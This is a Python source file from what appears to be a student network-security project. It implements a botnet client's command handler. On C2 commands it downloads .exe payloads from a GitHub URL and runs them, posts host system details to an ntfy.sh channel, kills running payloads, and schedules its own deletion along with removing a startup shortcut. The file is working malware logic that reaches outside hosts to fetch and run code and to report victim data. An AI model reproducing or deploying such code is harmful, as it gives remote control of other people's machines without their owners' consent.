import os
import sys
import requests
import platform
import subprocess
from bots.Command import Command

RESPONSE_URL = "https://ntfy.sh/BNS_BN_22"

# Handles the recieved commands from the C2 server and executes the corresponding actions on the bot's system
class CommandHandler:
    def __init__(self, bot, crypt):
        self.bot = bot
        self.crypt = crypt
        self.__init_os_info()

    def __init_os_info(self):
        # DEVICE ID
        self.MAC_ADDR = "00:1A:2B:3C:4D:5E"  # Placeholder for MAC address retrieval logic
        self.IP_ADDR = "192.168.1.100"  # Placeholder for IP address retrieval logic

        # DEVICE INFO
        self.ARCHITECTURE = platform.machine()
        self.CPU_INFO = platform.processor()

        # OS INFO
        self.OS_NAME = platform.system()
        self.OS_VERSION = platform.release()


    def __get_os_info(self):
        return f"MAC Address: {self.MAC_ADDR} \nIP Address: {self.IP_ADDR} \nOS: {self.OS_NAME} {self.OS_VERSION} \nArchitecture: {self.ARCHITECTURE} \nCPU: {self.CPU_INFO}"


    # Convert the command string to the corresponding Command enum value, return Command.NONE if no match is found
    def __convert_cmd_to_enum(self, cmd: str):
        if cmd == Command.STATUS.value:
            return Command.STATUS
        elif cmd == Command.PAYLOAD.value:
            return Command.PAYLOAD
        elif cmd == Command.EXECUTE.value:
            return Command.EXECUTE
        elif cmd == Command.STOP.value:
            return Command.STOP
        elif cmd == Command.REMOVE.value:
            return Command.REMOVE
        else:
            return Command.NONE


    # Download the payload from a specified URL and save it to the bot's system
    def __download_payload(self, id: str):
        payloadURL = f"https://raw.githubusercontent.com/WannesDH-2261159/BNS_BN_22/main/{id}.exe"
        outputFile = f"{id}.exe"

        print(f"Downloading payload... from URL: {payloadURL}")
        r = requests.get(payloadURL)
        if r.status_code == 200:
            with open(outputFile, "wb") as f:
                f.write(r.content)
            print("File downloaded successfully")
        else:
            print("Failed to download file:", r.status_code)


    # Execute the payload on the bot's system, handle any errors that may occur during execution
    def __executePayload(self, id: str):
        print("Executing Payload...")
        payload_name = f"{id}.exe"
        self.payloads.append(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
        print("Payload executed successfully.")


    # Stop any running payloads
    def __stopPayload(self):
        print("Stopping Payloads...")
        for i in self.payloads:
            try:
                i.send_signal(1)  # Send CTRL_BREAK_EVENT to gracefully stop the process
                i.wait(timeout=5)
            except subprocess.TimeoutExpired:
                i.kill()
                i.wait()
            except Exception as e:
                print(f"Error stopping payload: {e}")

        print("All Payloads stopped successfully.")
        self.payloads = []


    # Announce bot status to C2 server
    def __announce_status(self):
        print("Announcing status to C2 server...")

        r = requests.post(RESPONSE_URL, data=self.__get_os_info().encode(encoding='utf-8'))
        if r.status_code == 200:
            print(f"Bot announced status successfully.")
        else:
            print(f"Bot failed to announce status.")


    def __schedule_self_delete(self):
        exe_path = os.path.abspath(sys.argv[0])
        if os.name == "nt":  # Windows
            subprocess.Popen(
                f'cmd /c ping 127.0.0.1 -n 5 > nul & del "{exe_path}"',
                shell=True
            )
        else:  # Linux / macOS
            subprocess.Popen(
                f'sh -c "sleep 5 && rm \\"{exe_path}\\""',
                shell=True
            )

        # Delete shortcut if exists
        shortcut_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
                                     'Start Menu', 'Programs', 'Startup', 'BotnetStartup.lnk')
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)

        # Stop bot
        self.bot.quit = True


    # Handle commands received from C2 server
    def handle_command(self, cmd_tuple):
        cmd, id, params = cmd_tuple
        cmd = self.__convert_cmd_to_enum(cmd)

        print(f"Handling command: {cmd}, id: {id}, params: {params}")

        if cmd == Command.STATUS:
            self.__announce_status()
        elif cmd == Command.PAYLOAD:
            self.__download_payload(id)
        elif cmd == Command.EXECUTE:
            self.__executePayload(id)
        elif cmd == Command.STOP:
            self.__stopPayload()
        elif cmd == Command.REMOVE:
            self.__stopPayload()
            # TODO: Remove payload
            self.__schedule_self_delete()
        else:
            print ("Received unknown command, ignoring...")


    # Remove all payload files from the bot's system
    def cleanupPayloads(self):
        path = "C:/Users/User/Desktop/uhasselt/Basic Networc Security/code/remove self/dir"
        dir_list = os.listdir(path)

        print(sys.argv[0])

        for file in dir_list:
            os.remove(path + "/" + file)
        os.removedirs(path)
